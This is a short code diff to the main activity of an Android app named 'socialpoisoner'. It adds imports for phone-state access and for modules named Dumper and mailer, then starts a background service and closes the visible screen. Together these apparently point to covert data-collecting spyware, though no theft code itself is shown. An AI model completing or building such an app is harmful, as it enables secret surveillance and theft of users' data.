@@ -1,13 +1,23 @@
 package com.cakeman.doctorrabb.socialpoisoner;
 
 import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import com.cakeman.doctorrabb.socialpoisoner.modules.Dumper;
 import com.cakeman.doctorrabb.socialpoisoner.modules.Util;
+import com.cakeman.doctorrabb.socialpoisoner.modules.constants;
+import com.cakeman.doctorrabb.socialpoisoner.modules.mailer;
+import com.cakeman.doctorrabb.socialpoisoner.modules.messageBuilder;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 /*
     Code of MainActivity.java.
@@ -28,7 +38,6 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             Log.e ("Request Permission Error", e.getMessage());
         }
-
         startService (new Intent (this, srv.class));
         finish();
     }
